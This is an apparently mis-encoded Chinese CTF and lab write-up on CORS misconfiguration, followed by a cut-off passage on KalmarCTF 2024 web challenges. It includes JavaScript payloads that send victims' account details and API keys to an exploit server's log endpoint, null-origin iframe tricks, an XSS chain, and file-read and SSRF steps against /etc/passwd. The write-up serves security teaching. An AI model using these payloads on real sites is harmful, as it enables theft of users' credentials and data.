åŒæ—¶æ»¡è¶³è¿™ä¸‰ç§æ¡ä»¶å°±æ˜¯åŒæºï¼Œå½“å­˜åœ¨ä¸¤ä¸ªç«™ç‚¹ï¼Œå…¶ä¸­æœ‰ä¸€é¡¹ä¸æ»¡è¶³ç›¸åŒæ¡ä»¶çš„æ—¶å€™ï¼Œæˆ‘ä»¬å³å¯è¯´è¿™ä¸¤ä¸ªç«™ç‚¹ä¸æ˜¯åŒæºç«™ç‚¹ï¼Œè€Œå½“å…¶ä¸­ä¸€ä¸ªç«™ç‚¹æƒ³è¯·æ±‚å¦å¤–ä¸€ä¸ªç«™ç‚¹çš„èµ„æºçš„æ—¶å€™æˆ‘ä»¬è¾¹ç§°å®ƒä¸ºè·¨åŸŸè¯·æ±‚ï¼Œè€Œç”±äºå®‰å…¨è€ƒè™‘ï¼Œè·¨åŸŸè¯·æ±‚ä¼šå—åˆ°åŒæºç­–ç•¥çš„é™åˆ¶ ä¸å—å½±å“çš„æ ‡ç­¾ åœ¨HTMLä¸­a, form, img, script, iframe, link ç­‰æ ‡ç­¾ä»¥åŠ Ajax éƒ½å¯ä»¥æŒ‡å‘ä¸€ä¸ªèµ„æºåœ°å€ åœ¨è¿™äº›æ ‡ç­¾ä¸­æœ‰ä»¥ä¸‹çš„æ ‡ç­¾ä¸å—åŒæºç­–ç•¥çš„é™åˆ¶ script img link css ç”¨æˆ·å¯¹è·¨åŸŸçš„éœ€æ±‚ æ¯”å¦‚å‰åç«¯åˆ†ç¦»çš„æƒ…å†µï¼Œå‰åç«¯åŸŸåä¸åŒï¼Œä½†æ˜¯å‰ç«¯ä¼šéœ€è¦ç”¨åˆ°åç«¯çš„æ¥å£ï¼Œå‘é€ajaxè¯·æ±‚ ç”µå•†ç½‘ç«™åŠ è½½ç¬¬ä¸‰æ–¹å¿«é€’ç½‘ç«™çš„ç‰©æµä¿¡æ¯ è·¨åŸŸè¯·æ±‚æ–¹å¼CORSå®šä¹‰äº†ä¸¤ç§è·¨åŸŸè¯·æ±‚ï¼Œç®€å•è·¨åŸŸè¯·æ±‚å’Œéç®€å•è·¨åŸŸè¯·æ±‚ã€‚åªè¦åŒæ—¶æ»¡è¶³ä»¥ä¸‹ä¸¤å¤§æ¡ä»¶ï¼Œå°±å±äºç®€å•è¯·æ±‚ã€‚ è¯·æ±‚æ–¹æ³•æ˜¯ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ä¹‹ä¸€ï¼š HEAD GET POST HTTPçš„å¤´ä¿¡æ¯ä¸è¶…å‡ºä»¥ä¸‹å‡ ç§å­—æ®µï¼š Accept Accept-Language Content-Language Last-Event-ID Content-Typeï¼šåªé™äºä¸‰ä¸ªå€¼application/x-www-form-urlencodedã€multipart/form-dataã€text/plain ç®€å•çš„è¯´å°±æ˜¯è®¾ç½®äº†ä¸€ä¸ªç™½åå•ï¼Œç¬¦åˆè¿™ä¸ªæ¡ä»¶çš„æ‰æ˜¯ç®€å•è¯·æ±‚ã€‚å…¶ä»–ä¸ç¬¦åˆçš„éƒ½æ˜¯éç®€å•è¯·æ±‚ã€‚ æµè§ˆå™¨å¯¹ç®€å•è¯·æ±‚å’Œéç®€å•è¯·æ±‚çš„å¤„ç†æœºåˆ¶ä¸ä¸€æ ·ã€‚å¯¹äºç®€å•è¯·æ±‚ï¼Œæµè§ˆå™¨å°±ä¼šç«‹åˆ»å‘é€è¿™ä¸ªè¯·æ±‚ã€‚å¯¹äºéç®€å•è¯·æ±‚ï¼Œæµè§ˆå™¨ä¸ä¼šé©¬ä¸Šå‘é€è¿™ä¸ªè¯·æ±‚ï¼Œè€Œæ˜¯æœ‰ä¸€ä¸ªpreflightï¼Œè·ŸæœåŠ¡å™¨éªŒè¯çš„è¿‡ç¨‹ã€‚æµè§ˆå™¨å…ˆå‘é€ä¸€ä¸ªoptionsæ–¹æ³•çš„é¢„æ£€è¯·æ±‚ã€‚ CORSæœºåˆ¶è§£å†³ CORSï¼Œè·¨åŸŸèµ„æºå…±äº«ï¼ˆCross-origin resource sharingï¼‰ï¼Œæ˜¯H5æä¾›çš„ä¸€ç§æœºåˆ¶ï¼ŒWEBåº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡åœ¨HTTPå¢åŠ å­—æ®µæ¥å‘Šè¯‰æµè§ˆå™¨ï¼Œå“ªäº›ä¸åŒæ¥æºçš„æœåŠ¡å™¨æ˜¯æœ‰æƒè®¿é—®æœ¬ç«™èµ„æºçš„ï¼Œå½“ä¸åŒåŸŸçš„è¯·æ±‚å‘ç”Ÿæ—¶ï¼Œå°±å‡ºç°äº†è·¨åŸŸçš„ç°è±¡ã€‚ ä¸‹å›¾æ˜¯å¸¸è§çš„è·¨åŸŸä¼šé‡åˆ°çš„è¯·æ±‚å¤´ å½“å¯¹CORSé…ç½®ä¸å½“çš„æ—¶å€™ï¼Œå°±å¯¼è‡´èµ„æºè¢«æ¶æ„æ“ä½œï¼Œä¹Ÿå°±å‘ç”Ÿäº†CORSæ¼æ´ æ¼æ´æ£€æµ‹ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¿®æ”¹è¯·æ±‚åŒ… Header ä¸­çš„ Origin å­—æ®µä¸ºä»»æ„åŸŸåæˆ–è€…ä¸º null çš„æ–¹å¼å»æ£€æµ‹è¯¥æ¼æ´æ˜¯å¦å­˜åœ¨ å¸¸è§çš„å‡ ç§æƒ…å†µå¦‚ä¸Šé¢çš„å›¾æ‰€ç¤ºï¼Œç”¨çº¢æ¡†æ ‡è®°çš„æ˜¯æœ€æœ‰ä»£è¡¨æ€§çš„ä¸‰ä¸ªå¤´ï¼Œå…¶ä¸­æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨ä¸ºè¯·æ±‚åŠ ä¸ŠOriginï¼Œç„¶åè§‚å¯Ÿå“åº”å¤´çš„Access-Control-Allow-Originå’ŒAccess-Control-Allow-Credentialsçš„å€¼ å…¶ä¸­Access-Control-Allow-Originè¡¨ç¤ºå…è®¸è·¨åŸŸè®¿é—®çš„host å°±ä¸‰ä¸ªå€¼ï¼Œå¯ä»¥è®¾ç½®æˆæŒ‡å®šçš„ç½‘ç«™ï¼Œä¹Ÿå¯ä»¥è®¾ç½®æˆ*è¡¨ç¤ºå…è®¸æ‰€æœ‰hostè·¨åŸŸè®¿é—®ï¼Œä¹Ÿå¯ä»¥è®¾ç½®ä¸ºnullï¼Œä½†æ˜¯é¦–å…ˆè®¾ç½®æˆnullå¹¶ä¸å¸¸è§ï¼Œå¹¶ä¸”ä¹Ÿä¸æ¨è å¦‚æœæƒ³è·¨åŸŸä¼ è¾“cookies,éœ€è¦Access-Control-Allow-Credentialsè®¾ç½®ä¸ºtrueï¼Œå¹¶ä¸”éœ€è¦ä¸XMLHttpRequest.withCredentials æˆ–Fetch APIä¸­çš„Request() æ„é€ å™¨ä¸­çš„credentials é€‰é¡¹ç»“åˆä½¿ç”¨ï¼Œä¾‹å¦‚ä½¿ç”¨XMLHttpRequestçš„æ—¶å€™éœ€è¦å°†withCredentialsçš„å€¼è®¾ç½®ä¸ºtrue æ¥ä¸‹æ¥æŒ‰ç…§å¸¸è§æ€§åˆ†ä¸ºå‡ ç§æƒ…å†µ Access-Control-Allow-Origin Access-Control-Allow-Credentials ç»“æœ * true ä¸å­˜åœ¨æ¼æ´ all-host/all-host true å­˜åœ¨æ¼æ´ safe_host true å®‰å…¨-ä¸å­˜åœ¨æ¼æ´ null true å­˜åœ¨æ¼æ´ ç¬¬ä¸€ç§ï¼ŒAllow-Originä¸º * ï¼ŒAllow-Credentialsä¸º trueåç«¯ä»£ç å¦‚ä¸‹ï¼š æŒ‰ç…§ä¸Šé¢æ¼æ´æ£€æµ‹çš„æ–¹æ³•æ£€æµ‹ï¼Œç»“æœå¦‚ä¸‹ï¼š å‰é¢æˆ‘ä»¬çŸ¥é“Access-Control-Allow-Originè¡¨ç¤ºå…è®¸è·¨åŸŸè®¿é—®çš„hostï¼Œæˆ‘ä»¬è¿™é‡Œè®¾ç½®æˆäº†é€šé…ç¬¦*ï¼Œä»£è¡¨å…è®¸æ‰€æœ‰ç½‘ç«™çš„è·¨åŸŸè¯·æ±‚ï¼Œå½“è¿™ç§æƒ…å†µçš„æ—¶å€™ï¼Œå³ä¾¿Access-Control-Allow-Credentialsä¸ºtrueï¼Œé‚£ä¹ˆä¼šè¢«è®¤å®šä¸ºä¸å®‰å…¨çš„ï¼Œå°†ä¸èƒ½å°†cookieå‘é€åˆ°æœåŠ¡ç«¯ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ä¼šå¤±è´¥ æ”»å‡»æœåŠ¡å™¨ä»£ç ï¼šindex.jsp %@ page language=java contentType=text/html; charset=UTF-8 pageEncoding=UTF-8%htmlbodyh2Hello World!/h2 button id=attack type=button onclick=attack()ç‚¹æˆ‘æŠ¢çº¢åŒ…/button/bodyscript function attack() var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function () // å½“å“åº”è¯·æ±‚å®Œæˆï¼Œå¹¶ä¸”è¿”å›200çš„æ—¶å€™å¼¹å‡ºå“åº”ä½“ if (this.readyState == 4 this.status == 200) if(this.response == || this.response == null) alert(æ­å–œå·²ç»ç»•è¿‡äº†åŒæºç­–ç•¥ï¼Œä½†æ˜¯å“åº”ä½“ä¸ºç©ºï¼Œåˆ©ç”¨å¤±è´¥); else alert(é»‘å®¢å·²ç»æ‹¿åˆ°ä½ çš„æ•æ„Ÿä¿¡æ¯----+this.response) //æ‰“å¼€é¶æœºåœ°å€ xhttp.open(GET,http://192.168.1.2:8080/info,true); //ä½¿ç”¨ cookieã€æˆæƒæ ‡å¤´æˆ– TLS å®¢æˆ·ç«¯è¯ä¹¦ç­‰å‡­æ®è¿›è¡Œè·¨ç«™ç‚¹è¯·æ±‚ xhttp.withCredentials = true; xhttp.send(); /script/html é¶æœºåœ°å€ï¼š 192.168.1.2:8080 æ”»å‡»æœåŠ¡å™¨åœ°å€ï¼š192.168.1.251:8080 å½“ç”¨æˆ·ç™»å½•çŠ¶æ€ä¸‹ï¼Œè®¿é—®æˆ‘ä»¬çš„ç½‘ç«™å¹¶ç‚¹å‡»ç›¸å…³æŒ‰é’®çš„æ—¶å€™ï¼Œå‘ä¸‹æ²¡æœ‰ä»»ä½•ååº”ï¼Œè¿™æ—¶å€™æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å“åº”ä½“å’Œæ§åˆ¶å°ï¼Œå‘ç°è¯·æ±‚å·²ç»è¢«åŒæºç­–ç•¥ç¦æ­¢äº† ç¬¬äºŒç§ï¼ŒAllow-Originä¸ºall-host ï¼ŒAllow-Credentialsä¸º true/all-hostè¿™ç§çš„è¯å…¶å®ä¹Ÿç›¸å½“äºåŒæ„äº†æ‰€æœ‰ç«™ç‚¹çš„è·¨åŸŸè¯·æ±‚ï¼Œä¸€èˆ¬å¦‚æœæ˜¯è¿™ç§æƒ…å†µï¼Œé‚£ä¹ˆæ¼æ´è‚¯å®šå­˜åœ¨å¹¶ä¸”å¯ä»¥åˆ©ç”¨ï¼Œè€Œå‡ºç°æ¼æ´çš„åŸå› å°±æ˜¯ä¸€äº›å¼€å‘ä¸ºäº†å›¾æ–¹ä¾¿å¯¼è‡´çš„ åç«¯ä»£ç å¦‚ä¸‹ï¼š æµ‹è¯•çš„ç»“æœå¦‚ä¸‹ï¼š è¿™æ ·å­çš„è¯ä¾¿å¯ä»¥åˆ©ç”¨æˆåŠŸ ä½†æ˜¯åœ¨æ­£å¸¸çš„æµè§ˆå™¨ä¸Šé¢å°è¯•çš„è¯ä¾¿ä¸ä¼šæˆåŠŸï¼ˆæ‰€çœ‹æ–‡ç« çš„ä½œè€…åœ¨è™šæ‹Ÿæœºä¸Šä¸‹çš„ä¸€ä¸ªè°·æ­Œçš„ç›—ç‰ˆæµè§ˆå™¨ï¼‰ åŸå› å°±æ˜¯SameSiteå±æ€§ï¼Œ2016å¹´å¼€å§‹ï¼ŒChrome 51ç‰ˆæœ¬å¯¹Cookieæ–°å¢äº†ä¸€ä¸ª SameSiteå±æ€§ï¼Œä¸ºäº†é˜²æ­¢CSRFæ”»å‡»ï¼Œé™†ç»­çš„å„å¤§å‚å•†çš„æµè§ˆå™¨ä¹Ÿéƒ½é€‚é…äº†è¯¥å±æ€§ï¼Œè¯¥å±æ€§æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå±•ç¤ºäº†SameSiteå’Œå…¶å®ƒè·Ÿcookieæœ‰å…³çš„è®¾ç½®çš„åŸºæœ¬ç”¨é€” samesiteå±æ€§æœ‰ä¸‰ä¸ªå€¼ Strictï¼šæœ€ä¸ºä¸¥æ ¼ï¼Œå®Œå…¨ç¦æ­¢ç¬¬ä¸‰æ–¹ Cookieï¼Œè·¨ç«™ç‚¹æ—¶ï¼Œä»»ä½•æƒ…å†µä¸‹éƒ½ä¸ä¼šå‘é€ Cookieã€‚ Laxï¼šå½“å¼€å‘å¼€å‘äººå‘˜æ²¡æœ‰è®¾ç½®samesiteçš„å€¼å¾—æ—¶å€™ï¼ŒLaxæ˜¯é»˜è®¤å€¼ï¼Œè§„åˆ™ç¨ç¨æ”¾å®½ï¼Œå¤§å¤šæ•°æƒ…å†µä¹Ÿæ˜¯ä¸å‘é€ç¬¬ä¸‰æ–¹ Cookieï¼Œè¯¦ç»†å¦‚ä¸‹å›¾ æˆ‘ä»¬åˆ©ç”¨é¡µé¢çš„è¯·æ±‚ï¼Œå¯ä»¥ç®—ä½œä¸€ä¸ªAJAXï¼Œæ‰€ä»¥å½“æˆ‘ä»¬é»˜è®¤æƒ…å†µä¸‹å»åˆ©ç”¨ä¸ä¼šå‘é€cookie Noneï¼šæ‰€æœ‰è¯·æ±‚ä¸­éƒ½å…è®¸å‘é€cookieï¼Œä½†æ˜¯å¦‚æœsamesiteé…ç½®æˆäº†noneï¼Œè¿˜å¿…é¡»å°†cookieåŠ ä¸ŠSecureå±æ€§æ‰èƒ½å¤Ÿç”Ÿæ•ˆ æ‰€ä»¥å½“é‡åˆ°httpsåè®®çš„ç«™ç‚¹ï¼Œå¹¶ä¸”cookieçš„samesiteè¢«è®¾ç½®æˆNoneçš„æ—¶å€™ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘å°†ç«™ç‚¹æ”¹æˆäº†httpsï¼Œå¹¶ä¸”åŠ ä¸Šäº†samesiteNoneä»¥åŠSecure åˆ©ç”¨æˆåŠŸï¼Œå…¶ä¸­å½“Allow-Originè®¾ç½®ä¸ºsafe-hostç±»ä¼¼ ç¬¬ä¸‰ç§ï¼ŒAllow-Originä¸ºnullï¼ŒAllow-Credentialsä¸ºtrueè¿™ç§æƒ…å†µå¯ä»¥è¢«ç»•è¿‡ï¼Œå› ä¸ºä»»ä½•ä½¿ç”¨éåˆ†çº§åè®®ï¼ˆå¦‚ data: æˆ– file:ï¼‰çš„èµ„æºå’Œæ²™ç›’æ–‡ä»¶çš„ Origin çš„åºåˆ—åŒ–éƒ½è¢«å®šä¹‰ä¸ºâ€˜nullâ€™ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œåˆ©ç”¨iframeæ ‡ç­¾ï¼Œä½¿ç”¨ data url æ ¼å¼å°†srcçš„å€¼ç›´æ¥åŠ è½½ä¸ºhtmlï¼ˆåŒæ ·çš„åˆ©ç”¨æˆåŠŸçš„å‰æä»ç„¶è¦è€ƒè™‘æˆ‘ä»¬ä¸Šè¿°æåˆ°çš„samesiteï¼‰ iframe sandbox=allow-scripts allow-top-navigation allow-forms allow-modals src=data:text/html;charset=UTF-8,script var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function () // å½“å“åº”è¯·æ±‚å®Œæˆï¼Œå¹¶ä¸”è¿”å›200çš„æ—¶å€™å¼¹å‡ºå“åº”ä½“ if (this.readyState == 4 this.status == 200) if(this.responseText == || this.responseText == null) alert(æ­å–œå·²ç»ç»•è¿‡äº†åŒæºç­–ç•¥ï¼Œä½†æ˜¯å“åº”ä½“ä¸ºç©ºï¼Œåˆ©ç”¨å¤±è´¥); console.log(no,+this.responseText) else alert(é»‘å®¢å·²ç»æ‹¿åˆ°ä½ çš„æ•æ„Ÿä¿¡æ¯----+this.responseText); console.log(yes,+this.responseText) xhttp.open(GET,https://192.168.1.2:8443/info,true); xhttp.withCredentials = true; xhttp.send(); /script/iframe åˆ©ç”¨æˆåŠŸ å½“ç„¶ä¹Ÿå¯ä»¥åˆ©ç”¨h5çš„æ–°å±æ€§srcdoc iframe sandbox=allow-scripts allow-top-navigation allow-forms allow-modals srcdoc=script var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function () // å½“å“åº”è¯·æ±‚å®Œæˆï¼Œå¹¶ä¸”è¿”å›200çš„æ—¶å€™å¼¹å‡ºå“åº”ä½“ if (this.readyState == 4 this.status == 200) alert(this.responseText); xhttp.open(GET,https://192.168.1.2:8443/info,true); xhttp.withCredentials = true; xhttp.send();/script /iframe åŒæ ·å¯ä»¥åˆ©ç”¨ å®æˆ˜Labï¼šå…·æœ‰åŸºæœ¬æºåå°„çš„ CORS æ¼æ´è¦æ±‚ï¼šè¦è§£å†³è¯¥å®éªŒé—®é¢˜ï¼Œè¯·åˆ¶ä½œä¸€äº›ä½¿ç”¨ CORS æ£€ç´¢ç®¡ç†å‘˜çš„ API å¯†é’¥å¹¶å°†ä»£ç ä¸Šä¼ åˆ°æ¼æ´åˆ©ç”¨æœåŠ¡å™¨çš„ JavaScript é¦–å…ˆæˆ‘ä»¬å…ˆå¼€å¯bpï¼Œå…³æ‰æ‹¦æˆªï¼Œæ‰“å¼€è°·æ­Œçš„proxyæ’ä»¶ï¼Œç„¶åç™»å½•é¢˜ç›®æä¾›ç»™æˆ‘ä»¬çš„è´¦å·ï¼ŒæˆåŠŸç™»å½•åæŸ¥çœ‹ä»£ç†æ¨¡å—ä¸­çš„HTTPå†å²è®°å½•ï¼Œç‚¹å‡»/accountDetailsï¼Œè§‚å¯Ÿå¯†é’¥æ˜¯å¦é€šè¿‡å¯¹ /accountDetails çš„ AJAX è¯·æ±‚æ£€ç´¢ï¼Œå¹¶ä¸”å“åº”åŒ…å«è¡¨æ˜å®ƒå¯èƒ½æ”¯æŒ CORS çš„ Access-Control-Allow-Credentials æ ‡å¤´ï¼Œæ‰€ä»¥æŠŠè¯¥æ¡ç›®å‘é€åˆ°é‡æ”¾å™¨é‡Œé¢ï¼ŒæŒ‰ç…§ä¸Šé¢çš„æ–¹æ³•æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å«æœ‰CORSæ¼æ´ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š å¯ä»¥å‘ç°æ¥å—æ‰€æœ‰çš„é“¾æ¥ï¼Œå¹¶ä¸”Allow-Credentialsä¸º trueï¼Œæœ‰æ¼æ´å¯ä»¥åˆ©ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ°bpç»™æˆ‘ä»¬æä¾›çš„æ¼æ´åˆ©ç”¨æœåŠ¡å™¨ä¸­ï¼Œå¹¶åœ¨å…¶ä¸­çš„htmlä»£ç çš„bodyéƒ¨åˆ†è¾“å…¥ä»¥ä¸‹ä»£ç ï¼š script var req = new XMLHttpRequest(); req.onload = reqListener; req.open(get,YOUR-LAB-ID.web-security-academy.net/accountDetails,true); req.withCredentials = true; req.send(); function reqListener() location=/log?key=+this.responseText; ;/script å¯¹ä»¥ä¸Šä»£ç çš„è§£é‡Šï¼š var req = new XMLHttpRequest();ï¼šåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ XMLHttpRequest å¯¹è±¡ï¼Œç”¨äºå‘èµ· HTTP è¯·æ±‚ã€‚ req.onload = reqListener;ï¼šæŒ‡å®šäº†å½“è¯·æ±‚æˆåŠŸå®Œæˆæ—¶è°ƒç”¨çš„å›è°ƒå‡½æ•° reqListenerã€‚è¿™æ„å‘³ç€ä¸€æ—¦è¯·æ±‚æˆåŠŸè¿”å›æ•°æ®ï¼Œå°†ä¼šæ‰§è¡Œåä¸º reqListener çš„å‡½æ•°ã€‚ req.open(get,YOUR-LAB-ID.web-security-academy.net/accountDetails,true);ï¼šä½¿ç”¨ GET æ–¹æ³•æ‰“å¼€äº†ä¸€ä¸ªä¸æŒ‡å®š URL çš„å¼‚æ­¥ï¼ˆtrue è¡¨ç¤ºå¼‚æ­¥ï¼‰HTTP è¿æ¥ã€‚è¯¥ URL æ˜¯ä¸€ä¸ªåŒ…å«ç”¨æˆ·è´¦æˆ·è¯¦æƒ…çš„èµ„æºã€‚ req.withCredentials = true;ï¼šè®¾ç½®äº† XMLHttpRequest å¯¹è±¡çš„ withCredentials å±æ€§ä¸º trueã€‚è¿™è¡¨ç¤ºåœ¨è¯·æ±‚ä¸­ä¼šåŒ…å«å‡­æ®ï¼ˆå¦‚ cookieã€æˆæƒæ ‡å¤´ç­‰ï¼‰ï¼Œä»è€Œå…è®¸åœ¨è·¨åŸŸè¯·æ±‚ä¸­å‘é€èº«ä»½éªŒè¯ä¿¡æ¯ã€‚ req.send();ï¼šå‘é€äº† HTTP è¯·æ±‚åˆ°æŒ‡å®šçš„ URL ä¿å­˜ä¹‹åä¾¿å¯ä»¥å°†å…¶å‘é€ç»™å—å®³è€…ï¼Œç„¶åæŸ¥çœ‹æ—¥å¿—ï¼Œè·å–åˆ°ç®¡ç†å‘˜çš„APIï¼Œé¢˜ç›®è§£å†³ Labï¼šå…·æœ‰å—ä¿¡ä»»çš„ null æºçš„ CORS æ¼æ´é¦–å…ˆæŒ‰ç…§ä¸Šé¢˜çš„æ–¹æ³•ä¸€æ ·æ£€æŸ¥æ˜¯å¦æœ‰CORSæ¼æ´ï¼Œä¸ä¸Šé¢˜ä¸ä¸€æ ·çš„æ˜¯è¿™é¢˜æˆ‘ä»¬åœ¨Originå¤„è¾“å…¥ä»»æ„ä¸€ä¸ªé“¾æ¥çš„è¯å“åº”ä½“é‡Œé¢ä¸ä¼šå›æ˜¾Access-Control-Allow-Originï¼Œä½†æ˜¯å½“æˆ‘ä»¬è¾“å…¥nullçš„æ—¶å€™ï¼Œå›æ˜¾æˆåŠŸï¼Œå¦‚ä¸‹ï¼š å›æ˜¾çš„è¿™ä¸¤æ¡è¯æ˜äº†è¿˜æ˜¯å­˜åœ¨CORSæ¼æ´çš„ï¼Œä¸è¿‡éœ€è¦ç”¨å¸¸è§çš„ç¬¬ä¸‰ç§æƒ…å†µé‡Œé¢çš„æ–¹æ³•ï¼Œåˆ°bpç»™æˆ‘ä»¬æä¾›çš„æ¼æ´åˆ©ç”¨æœåŠ¡å™¨ä¸­ï¼Œå¹¶åœ¨å…¶ä¸­çš„htmlä»£ç çš„bodyéƒ¨åˆ†è¾“å…¥ä»¥ä¸‹ä»£ç ï¼š iframe sandbox=allow-scripts allow-top-navigation allow-forms srcdoc=script var req = new XMLHttpRequest(); req.onload = reqListener; req.open(get,YOUR-LAB-ID.web-security-academy.net/accountDetails,true); req.withCredentials = true; req.send(); function reqListener() location=YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=+encodeURIComponent(this.responseText); ;/script/iframe æ³¨æ„ä½¿ç”¨ iframe æ²™ç›’ï¼Œå› ä¸ºè¿™ä¼šç”Ÿæˆ null æºè¯·æ±‚ æ¥ä¸‹æ¥æŒ‰ä¸Šé¢˜æ“ä½œï¼Œé¢˜ç›®è§£å†³ Labï¼šå…·æœ‰å—ä¿¡ä»»ä¸å®‰å…¨åè®®çš„ CORS æ¼æ´æŒ‰ç…§ä¸Šé¢ä¸¤é¢˜çš„æ­¥éª¤æ“ä½œå‘ç°å“åº”ä½“ä¸­éƒ½å›æ˜¾ä¸å‡ºAccess-Control-Allow-Originæ ‡å¤´ï¼Œäºæ˜¯æ ¹æ®é¢˜ç›®æç¤ºå°è¯•å­åŸŸåï¼Œç»“æœå¦‚ä¸‹ï¼š å‘ç°æ¥å—æœ¬åŸŸåä»¥åŠå­åŸŸåï¼Œè¿˜æ˜¯å­˜åœ¨CORSæ¼æ´çš„ æ‰“å¼€äº§å“é¡µé¢ï¼Œç‚¹å‡»æ£€æŸ¥åº“å­˜ï¼Œå¹¶è§‚å¯Ÿå®ƒæ˜¯å¦ä½¿ç”¨å­åŸŸä¸Šçš„ HTTP URL åŠ è½½ï¼ˆè¯·æ³¨æ„ï¼Œè¯¥ productID å‚æ•°å®¹æ˜“å—åˆ° XSS çš„å½±å“ï¼‰ äºæ˜¯åˆ°bpæä¾›çš„æ¼æ´åˆ©ç”¨æœåŠ¡å™¨ä¸­ï¼Œè¾“å…¥å¦‚ä¸‹ä»£ç ï¼š script document.location=http://stock.0a58005104085dbd81d52570007b00a4.web-security-academy.net/?productId=4scriptvar req = new XMLHttpRequest(); req.onload = reqListener; req.open(get,https://0a58005104085dbd81d52570007b00a4.web-security-academy.net/accountDetails,true); req.withCredentials = true;req.send();function reqListener() location=https://exploit-0abd005e04c25dbc818624a201780074.exploit-server.net/log?key=%2bthis.responseText; ;%3c/scriptstoreId=1/script æœ€å¥½å°±ä¸è¦å†æ•´ç†ï¼ˆæˆ‘æ•´ç†æ ¼å¼ä¹‹åå°è¯•ä¸å‡ºæ¥ï¼‰ï¼Œè¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯é¦–å…ˆå°†é¡µé¢é‡å®šå‘åˆ°ä¸€ä¸ªç‰¹å®šçš„URLï¼Œç„¶åä½¿ç”¨XMLHttpRequestå¯¹è±¡å‘å¦ä¸€ä¸ªURLå‘é€GETè¯·æ±‚ï¼Œè·å–è´¦æˆ·è¯¦æƒ…ä¿¡æ¯ã€‚å½“è¯·æ±‚å®Œæˆæ—¶ï¼Œä¼šå°†å“åº”å†…å®¹ä½œä¸ºå‚æ•°æ‹¼æ¥åˆ°å¦ä¸€ä¸ªURLä¸­ï¼Œå¹¶å°†é¡µé¢é‡å®šå‘åˆ°è¯¥URL æ¥ä¸‹æ¥æŒ‰ç…§ç¬¬ä¸€é¢˜é‚£æ ·ç»§ç»­æ“ä½œï¼Œæœ€åä¼šå¾—åˆ°ç®¡ç†å‘˜çš„APIï¼Œé¢˜ç›®è§£å†³","tags":["cors"],"categories":["CTF"]},{"title":"KalmarCTF 2024 Web Challenges","path":"/2024/03/21/KalmarCTF-2024-Web-Challenges/","content":"Ez â›³ v2æŒ‰ç…§é¢˜è§£ä¸­æ‰€è®²ä¸‹é¢è¿™æ®µä»£ç æ¯”è¾ƒé‡è¦ ua.caddy.chal-kalmarc.tf tls internaltemplatesimport html_reply `User-Agent: .Req.Header.Get User-Agent`http.caddy.chal-kalmarc.tf tls internaltemplatesimport html_reply You are connected with http.request.proto (tls_version, tls_cipher). å‘ç°User-Agentå¤„æœ‰å¯èƒ½æ˜¯å­˜åœ¨æ¨¡æ¿æ³¨å…¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å»è¯•éªŒä¸€ä¸‹ 7ï¼Œä¼šå›æ˜¾ï¼Œä½†æ˜¯è¾“å…¥å…¶ä»–çš„æ¯”å¦‚ 7*7çš„æ—¶å€™ä¼šè¿”å›500ï¼Œè¿™æ—¶å€™ä¾¿åº”è¯¥å»æŸ¥å®˜æ–¹çš„ç›¸å…³æ–‡æ¡£ï¼ˆåšé¢˜æ—¶å®Œå…¨æ²¡æœ‰æ„è¯†åˆ°è¿™ç‚¹ï¼‰ï¼šhttps://caddyserver.com/docs/modules/http.handlers.templates#docs æŸ¥çœ‹çš„æ—¶å€™ä¼šå‘ç°ä¸¤ä¸ªæåˆ«æœ‰æ„æ€çš„è¯­å¥ï¼Œå¦‚ä¸‹ï¼š è¿™ä¸¤ä¸ªå‡½æ•°éƒ½å¯ä»¥å‘ˆç°å‡ºæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥è¯•éªŒ readFlile /etc/passwdï¼Œå›æ˜¾å†…å®¹ ä»¥ä¸Šè¿™ä¸ªå‡½æ•°å¯ä»¥ç”¨æ¥æ˜¾ç¤ºç›®å½•ä¸‹é¢çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥å‘½ä»¤ listFiles \"/\"ï¼Œæ ¹ç›®å½•ä¸‹æ–‡ä»¶æ˜¾ç¤ºå‡ºæ¥ï¼Œç„¶ååˆ©ç”¨å¯ä»¥è¯»å–æ–‡ä»¶çš„é‚£ä¸¤ä¸ªæ–¹æ³•æ¥è¯»å–flagæ–‡ä»¶ï¼Œå¾—åˆ°æˆ‘ä»¬æ‰€éœ€çš„flag Is It Downè¯¥é¢˜æ˜¯è¾“å…¥ä¸€ä¸ªurlåå¯ä»¥å¯¹è¯¥urlè¿›è¡Œä¸€ä¸ªcheckï¼Œæ˜¯ä¸€ä¸ªæ˜æ˜¾çš„ssrfï¼Œä½†æ˜¯è¾“å…¥çš„ç½‘å€è¦æ±‚å¿…é¡»æ˜¯httpså¼€å¤´ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ è‡ªå·±çš„httpsç½‘å€ï¼Œä»é‚£é‡Œé‡å®šå‘åˆ°httpç½‘å€å»ï¼Œç›¸å…³çš„phpä»£ç å¦‚ä¸‹ï¼š ?phpheader(Location: .$_GET[x]);? ç”±äºæ˜¯ä¸ªæ˜æ˜¾çš„ssrfæ¼æ´ï¼Œæˆ‘ä»¬å°è¯•é€šè¿‡fileä¼ªåè®®æ¥è¯»å–æœ¬åœ°æ–‡ä»¶ï¼šhttps://ctf.hijwei.top/?wells=file:///etc/passwdï¼ŒæˆåŠŸè¯»å– æˆ‘ä»¬å¯ä»¥ç”¨ 